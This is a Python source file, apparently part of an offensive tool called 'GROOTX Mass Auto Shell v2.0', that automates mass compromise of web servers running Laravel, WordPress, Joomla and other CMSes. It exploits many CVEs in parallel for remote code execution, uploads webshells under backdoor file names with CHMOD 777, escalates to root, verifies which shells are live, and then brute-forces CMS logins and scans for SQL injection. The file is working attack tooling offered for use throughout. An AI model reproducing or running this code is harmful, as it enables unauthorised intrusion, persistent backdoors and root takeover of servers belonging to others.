                            self._exploited_set.add(target)
                            self.total_exploited += 1
                            self.exploited_targets.append((target, cve_id))
                        self.tracker.add(target, "EXPLOIT", "OK", f"RCE via {cve_id} (generic)", cve=cve_id, stage="exploit")
                        self.write(VULN_LIST, f"{target} ({cve_id}_EXPLOITED)")
                    return {"target": target, "exploited": True, "cve": cve_id, "is_rce": True}
        except:
            pass
        return {"target": target, "exploited": False, "cve": cve_id}

    def mass_exploit(self, vuln_targets):
        """Phase 2: Exploit all vulnerable targets in parallel."""
        console.print(f"\n[bold cyan][PHASE 2][bold cyan] MASS MULTI-CVE EXPLOIT[/bold cyan]")
        console.print(f"[cyan]Targets: {len(vuln_targets)} | CVEs: {len(CVES)} | Threads: {THREADS}[/cyan]")
        self.exploited_targets = []
        self.total_exploited = 0

        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Exploiting all CVEs...", total=len(vuln_targets))
            with ThreadPoolExecutor(max_workers=min(THREADS, len(vuln_targets))) as executor:
                futures = {executor.submit(self._exploit_target_cve, td): td for td in vuln_targets}
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    try:
                        result = future.result()
                        if result and result.get("exploited"):
                            self.shell_queue.put(result["target"])
                            # Non-RCE CVEs that auto_shell via alternative vector
                            if not result.get("is_rce", True):
                                self.tracker.add(result["target"], "SHELL", "OK",
                                    f"Auto-shell via {result.get('cve','')} ({CVES.get(result.get('cve',''),{}).get('name','')})",
                                    cve=result.get("cve",""), stage="shell")
                                self.write(SHELL_ROOT, result["target"])
                    except Exception as e:
                        continue

        self.total_exploited = len(self.exploited_targets)
        console.print(f"[bold green][PHASE 2 COMPLETE][/bold green] {self.total_exploited} targets exploited")
        self.tracker.display_cve_summary()
        return self.exploited_targets

    # ═══════════════════════════════════════════════════════════
    # PHASE 3: MASS WEBSHELL UPLOAD (ENHANCED, FIXED)
    # ═══════════════════════════════════════════════════════════

    def _get_shell_content(self, variant="green_dir"):
        """Get shell content by variant."""
        return SHELL_PAYLOADS.get(variant, SHELL_PAYLOADS["green_dir"])

    def _upload_shell_enhanced(self, target_data):
        """Enhanced shell upload with multiple methods, variants, and retries."""
        target, cve_id = target_data
        target_clean = target.strip().rstrip('/')
        if not target_clean.startswith(("http://", "https://")):
            target_clean = "http://" + target_clean

        if target_clean in self._shell_set:
            return True

        shell_url = f"{target_clean}/commant_index.php"
        variants = self.payload_gen.get_all_payloads()
        random.shuffle(variants)

        for attempt in range(MAX_RETRIES):
            for name, payload, payload_key in variants:
                try:
                    # Determine file extension from name
                    filename = name  # already includes extension

                    # Try multi-platform upload
                    success, uploaded_url = upload_multiplatform_shell(
                        self.session, target_clean, payload, filename,
                        self.waf.get_headers(0)
                    )
                    if success:
                        with self._lock:
                            if target_clean not in self._shell_set:
                                self._shell_set.add(target_clean)
                                self.shell_targets.append((target_clean, cve_id, uploaded_url))
                                self.total_shells += 1
                                self.total_verified += 1
                            self.tracker.add(target_clean, "SHELL", "OK",
                                f"Shell at {uploaded_url} ({CVES[cve_id]['name']})",
                                shell_url=uploaded_url, cve=cve_id, stage="shell")
                            self.write(SHELL_ROOT, uploaded_url)
                            self.write(SHELL_RED, f"{uploaded_url} (GREENDIR + CHMOD 777)")
                            self.write(BACKUP_FILE, f"{uploaded_url} -> {target_clean.replace('://', '_').replace('/', '_')[:50]}_{filename}")
                        return True

                    # Also try with extended backdoor extensions
                    base_name = os.path.splitext(filename)[0]
                    for ext in BACKDOOR_EXTENSIONS:
                        if ext == os.path.splitext(filename)[1]:
                            continue  # already tried
                        ext_filename = base_name + ext
                        success2, url2 = upload_multiplatform_shell(
                            self.session, target_clean, payload, ext_filename,
                            self.waf.get_headers(1)
                        )
                        if success2:
                            with self._lock:
                                if target_clean not in self._shell_set:
                                    self._shell_set.add(target_clean)
                                    self.shell_targets.append((target_clean, cve_id, url2))
                                    self.total_shells += 1
                                    self.total_verified += 1
                            self.tracker.add(target_clean, "SHELL", "OK",
                                f"Shell at {url2} (ext={ext}, {CVES[cve_id]['name']})",
                                shell_url=url2, cve=cve_id, stage="shell")
                            self.write(SHELL_ROOT, url2)
                            self.write(SHELL_RED, f"{url2} (ext={ext})")
                            self.write(BACKUP_FILE, f"{url2} -> {target_clean.replace('://', '_').replace('/', '_')[:50]}_{ext_filename}")
                            return True

                except Exception as e:
                    continue

            if attempt < MAX_RETRIES - 1:
                time.sleep(0.5 * (attempt + 1))

        return False

    def mass_upload_shells(self, exploited_targets):
        """Phase 3: Upload shells to all exploited targets."""
        console.print(f"\n[bold cyan][PHASE 3][bold cyan] MASS WEBSHELL (ENHANCED)[/bold cyan]")
        console.print(f"[cyan]Targets: {len(exploited_targets)} | Payload variants: {len(self.payload_gen.get_all_payloads())} | Threads: {THREADS}[/cyan]")
        self.shell_targets = []
        self.total_shells = 0

        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Uploading enhanced shells...", total=len(exploited_targets))
            with ThreadPoolExecutor(max_workers=min(THREADS, len(exploited_targets))) as executor:
                futures = {executor.submit(self._upload_shell_enhanced, td): td for td in exploited_targets}
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    try:
                        future.result()
                    except Exception as e:
                        continue

        console.print(f"[bold green][PHASE 3 COMPLETE][/bold green] {self.total_shells} shells uploaded, {self.total_verified} verified alive")
        return self.shell_targets

    # ═══════════════════════════════════════════════════════════
    # PHASE 4: MASS ROOT ESCALATION (FIXED)
    # ═══════════════════════════════════════════════════════════

    def _root_target_v2(self, target_data):
        """Auto-root escalation with expanded vectors."""
        target, cve_id = target_data
        target_clean = target.strip().rstrip('/')
        if not target_clean.startswith(("http://", "https://")):
            target_clean = "http://" + target_clean
        if target_clean in self._root_set:
            return True

        try:
            root_session = requests.Session()
            root_session.verify = False
            root_session.timeout = 5
            root_session.headers.update(self.waf.get_headers(0))
            engine = AutoRootEngineV2(root_session)
            results = engine.escalate(target_clean, root_session)

            meaningful = [r for r in results if r["result"] not in ["no_suid", "no_sudo", "no_crontab", "not_checked", "kernel_check"]]
            if meaningful:
                with self._lock:
                    if target_clean not in self._root_set:
                        self._root_set.add(target_clean)
                        self.total_roots += 1
                        self.root_targets.append((target_clean, cve_id))
                    self.tracker.add(target_clean, "ROOT", "OK",
                        f"Root via {meaningful} ({CVES[cve_id]['name']})",
                        root_status="ROOT", cve=cve_id, stage="root")
                    self.write(ROOT_SUCCESS, f"{target_clean} ({cve_id}) - Stages: {[r['result'] for r in meaningful]}")
                return True
            return False
        except:
            return False

    def mass_root(self, shell_targets):
        """Phase 4: Root escalation on all shell targets."""
        console.print(f"\n[bold cyan][PHASE 4][bold cyan] MASS ROOT ESCALATION[/bold cyan]")
        console.print(f"[cyan]Targets: {len(shell_targets)} | SUID paths: {len(SUID_PATHS_EXPANDED)} | Sudoers: {len(COMMON_SUDOERS_EXPANDED)} | Threads: {THREADS}[/cyan]")
        self.root_targets = []
        self.total_roots = 0

        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Escalating to root...", total=len(shell_targets))
            with ThreadPoolExecutor(max_workers=min(THREADS, len(shell_targets))) as executor:
                futures = {executor.submit(self._root_target_v2, td): td for td in shell_targets}
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    try:
                        future.result()
                    except:
                        pass

        console.print(f"[bold green][PHASE 4 COMPLETE][/bold green] {self.total_roots} targets rooted")
        return self.root_targets

    # ═══════════════════════════════════════════════════════════
    # PHASE 5: VERIFY & IDENTIFY (FIXED)
    # ═══════════════════════════════════════════════════════════

    def verify_and_identify(self):
        """Phase 5: Verify all shells and generate final results."""
        console.print(f"\n[bold cyan][PHASE 5][bold cyan] VERIFY & IDENTIFY[/bold cyan]")
        alive = []
        dead = []

        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Verifying shells...", total=len(self.shell_targets))
            with ThreadPoolExecutor(max_workers=min(THREADS, len(self.shell_targets))) as executor:
                futures = {executor.submit(self._verify_shell, t[2]): t for t in self.shell_targets}
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    try:
                        result = future.result()
                        if result:
                            alive.append(result)
                    except:
                        pass

        # Re-verify dead shells with retry (different payload variants)
        dead_shells = [td for td in self.shell_targets if td[2] not in [a[2] for a in alive]]
        if dead_shells:
            console.print(f"[yellow]Retrying {len(dead_shells)} dead shells with alternate payloads...[/yellow]")
            for td in dead_shells:
                target_clean = td[0]
                # Try alternate shell names
                for alt_name in ["shell.php", "index.php", "upload.php", "backdoor.php", "admin.php"]:
                    alt_url = f"{target_clean}/{alt_name}"
                    try:
                        r = self.session.get(alt_url, headers=self.waf.get_headers(0), timeout=SHELL_VERIFY_TIMEOUT)
                        if r.status_code == 200 and len(r.text) > 10:
                            alive.append(td)
                            self.tracker.add(target_clean, "VERIFIED", "OK", f"Shell revived: {alt_url}", cve=td[1], stage="verify")
                            break
                    except:
                        continue

        console.print(f"[bold green][VERIFY COMPLETE][/bold green] {len(alive)} alive, {len(dead_shells)} dead")
        return alive, dead_shells

    def _verify_shell(self, shell_url):
        try:
            r = self.session.get(shell_url, headers=self.waf.get_headers(0), timeout=SHELL_VERIFY_TIMEOUT)
            if r.status_code == 200 and len(r.text) > 10:
                return shell_url
        except:
            pass
        return None

    def identify(self, all_targets):
        """Phase 5: Generate categorized identification results."""
        console.print(f"\n[bold cyan][PHASE 5][bold cyan] IDENTIFICATION[/bold cyan]")
        exploited_set = set(t[0] for t in self.exploited_targets)
        shell_set = set(t[0] for t in self.shell_targets)
        root_set = set(t[0] for t in self.root_targets)

        for t in all_targets:
            t_clean = t.strip().rstrip('/')
            cve_ids = [c for t2, c in self.vuln_targets if t2 == t_clean]
            cve_str = ",".join(cve_ids[:3]) if cve_ids else ""
            if t_clean not in exploited_set and t_clean not in self._vuln_set:
                self.tracker.add(t_clean, "NOTVULN", "OK", "Target not vulnerable", cve=cve_str)
            elif t_clean in exploited_set and t_clean not in shell_set:
                self.tracker.add(t_clean, "FAILED", "FAIL", "Exploited but shell upload failed", cve=cve_str)
            elif t_clean in shell_set and t_clean not in root_set:
                self.tracker.add(t_clean, "SHELL", "OK", f"Shell uploaded ({CVES[cve_ids[0]]['name'] if cve_ids else 'unknown'})", cve=cve_str, stage="shell")
            elif t_clean in root_set:
                self.tracker.add(t_clean, "ROOT", "OK", "Root access achieved", cve=cve_str, stage="root")

        self.tracker._save()
        self.tracker.display_table()
        self.tracker.display_cve_summary()

        summary = self.tracker.get_summary()
        console.print(f"\n[bold white]═══ MASS AUTO SHELL v2.0 FIXED SUMMARY ═══[/bold white]")
        console.print(f"  [dim]Total scanned:[/dim] {self.total_scanned}")
        console.print(f"  [yellow]VULNERABLE:[/yellow] {summary.get('VULN', 0)}")
        console.print(f"  [cyan]EXPLOITED:[/cyan] {summary.get('EXPLOIT', 0)}")
        console.print(f"  [green]SHELLS:[/green] {summary.get('SHELL', 0)}")
        console.print(f"  [bold green]ROOT:[/bold green] {summary.get('ROOT', 0)}")
        console.print(f"  [red]FAILED:[/red] {summary.get('FAILED', 0)}")
        console.print(f"  [dim]NOT VULN:[/dim] {summary.get('NOTVULN', 0)}")
        console.print(f"  [blue]VERIFIED:[/blue] {self.total_verified}")
        console.print(f"\n  Result IDs: [cyan]{RESULT_IDS}[/cyan]")
        console.print(f"  Shell list: [green]{SHELL_ROOT}[/green] ({self.total_shells} shells)")
        console.print(f"  Root list: [green]{ROOT_SUCCESS}[/green] ({self.total_roots} rooted)")

    # ═══════════════════════════════════════════════════════════
    # CMS BRUTE FORCE / DETECTION / SQLI (INTEGRATION)
    # ═══════════════════════════════════════════════════════════

    def run_cms_bruteforce(self, targets):
        """Run CMS brute force pada targets yang belum exploited."""
        try:
            from cms_bruteforce import MassBruteForce
            console.print("\n[bold cyan]CMS BRUTE FORCE INTEGRATION[/bold cyan]")
            bf = MassBruteForce()
            results = bf.run(targets, cms_type='all', threads=THREADS)
            return results
        except ImportError:
            console.print("[yellow]cms_bruteforce module not available[/yellow]")
            return []

    def run_cms_detection(self, targets):
        """Run CMS detection pada targets."""
        try:
            from cms_detector import CMSDetector
            console.print("\n[bold cyan]CMS DETECTION INTEGRATION[/bold cyan]")
            detector = CMSDetector()
            results = detector.detect_mass(targets, threads=THREADS)
            return results
        except ImportError:
            console.print("[yellow]cms_detector module not available[/yellow]")
            return []

    def run_sqli_scan(self, targets):
        """Run SQL injection scan pada targets."""
        try:
            from sqli_injector import SQLIInjector
            console.print("\n[bold cyan]SQL INJECTION SCAN INTEGRATION[/bold cyan]")
            injector = SQLIInjector()
            results = injector.scan_mass(targets, threads=THREADS)
            return results
        except ImportError:
            console.print("[yellow]sqli_injector module not available[/yellow]")
            return []

    # ═══════════════════════════════════════════════════════════
    # MAIN PIPELINE EXECUTION
    # ═══════════════════════════════════════════════════════════

    def run_pipeline(self, targets, direct_mode=False):
        """Execute the pipeline. If direct_mode=True, skip scan → langsung exploit semua target."""
        console.clear()
        if direct_mode:
            pipeline_line = "[bold]Pipeline: DIRECT EXPLOIT → WEBSHELL → ROOT → VERIFY[/bold]\n[yellow]Skip scan — blast semua CVE exploit methods ke semua target![/yellow]\n"
        else:
            pipeline_line = "[bold]Pipeline: ACQUIRE → SCAN → EXPLOIT → WEBSHELL → ROOT → VERIFY → IDENTIFY[/bold]\n"
        desc = (
            "[bold white]GROOTX MASS AUTO SHELL v2.0 FIXED[/bold white]\n"
            "[cyan]Multi-CVE | Laravel+WordPress+Joomla+Roundcube+CodeIgniter+phpfm[/cyan]\n"
            + pipeline_line
            + f"[green]Threads: {THREADS} | Retries: {MAX_RETRIES}[/green]\n"
            + f"[magenta]CVEs: {len(CVES)} | Targets: {len(targets)}[/magenta]"
        )
        console.print(Panel.fit(desc, title="[bold]MASS AUTO SHELL v2.0 FIXED[/bold]"))

        start_time = time.time()

        if direct_mode:
            console.print(f"\n[bold red][DIRECT MODE] SKIP SCAN — BLAST EXPLOIT MODES TO ALL TARGETS[/bold red]")
            console.print(f"[yellow]Targets: {len(targets)} | CVEs: {len(CVES)} | Threads: {THREADS}[/yellow]")
            vuln_targets = [(t, cve_id) for t in targets for cve_id in CVES]
        else:
            vuln_targets = self.mass_scan(targets)
            if not vuln_targets:
                console.print("[bold red][!] No vulnerable targets found.[/bold red]")
                return

        exploited_targets = self.mass_exploit(vuln_targets)
        if not exploited_targets:
            console.print("[bold yellow][!] No targets exploited.[/bold yellow]")
            return

        if exploited_targets:
            shell_targets = self.mass_upload_shells(exploited_targets)
        else:
            shell_targets = []

        if shell_targets:
            root_targets = self.mass_root(shell_targets)
        else:
            root_targets = []

        self.identify(targets)

        if shell_targets:
            alive, dead = self.verify_and_identify()

        console.print("\n[bold cyan]═══ PHASE 6: CMS BRUTE FORCE ═══[/bold cyan]")
        self.run_cms_bruteforce(targets)

        console.print("\n[bold cyan]═══ PHASE 7: CMS DETECTION ═══[/bold cyan]")
        self.run_cms_detection(targets)

        console.print("\n[bold cyan]═══ PHASE 8: SQL INJECTION SCAN ═══[/bold cyan]")
        self.run_sqli_scan(targets)

        elapsed = time.time() - start_time
        console.print(f"\n[bold green][+] Pipeline Selesai!! (v2.0 FIXED - Multi-CVE Mass Pipeline) in {elapsed:.1f}s[/bold green]")


def load_targets():
    """Load targets from list files."""
    targets = []
    input_file = None

    if os.path.exists(LISTROOT_FILE):
        with open(LISTROOT_FILE, "r") as f:
            targets = [l.strip() for l in f.read().splitlines() if l.strip()]
        input_file = LISTROOT_FILE
    if not targets and os.path.exists(INPUT_LIST):
        with open(INPUT_LIST, "r") as f:
            targets = [l.strip() for l in f.read().splitlines() if l.strip()]
        input_file = INPUT_LIST

    if not targets:
        console.print("[bold red][!] Neither listroot.txt nor list.txt found![/bold red]")
        sys.exit(1)

    # Filter already processed
    processed = set()
    for f_name in [VULN_LIST, SHELL_ROOT, SHELL_RED, NOT_SHELL, NOT_VULN, ROOT_SUCCESS, BACKUP_FILE, FAILED_SCAN]:
        if os.path.exists(f_name):
            try:
                with open(f_name, "r") as f:
                    for line in f:
                        processed.add(line.strip().rstrip('/'))
            except:
                pass

    targets = [t for t in targets if t.strip().strip('/') not in processed]
    console.print(f"[cyan]Targets to scan: {len(targets)} (skipped {len(processed)} already processed)[/cyan]")
    console.print(f"[cyan]Input: {input_file}[/cyan]")
    return targets


def main():
    """Entry point for GROOTX Mass Auto Shell v2.0 FIXED."""
    global THREADS, QUICK_MODE, INPUT_LIST
    parser = argparse.ArgumentParser(description="GROOTX Mass Auto Shell v2.0 FIXED")
    parser.add_argument("--list", help="Custom target list file")
    parser.add_argument("--threads", type=int, default=THREADS, help="Thread count")
    parser.add_argument("--quick", action="store_true", help="Quick mode")
    parser.add_argument("--cve", nargs="+", help="Filter by specific CVE(s)")
    parser.add_argument("--direct", action="store_true", help="Direct mass exploit — skip scan, blast semua CVE ke semua target")
    args = parser.parse_args()

    THREADS = args.threads
    QUICK_MODE = args.quick

    if args.list:
        INPUT_LIST = args.list

    targets = load_targets()
    if not targets:
        return

    pipeline = MassAutoShellV2(direct_mode=args.direct)
    pipeline.run_pipeline(targets, direct_mode=args.direct)


if __name__ == "__main__":
    main()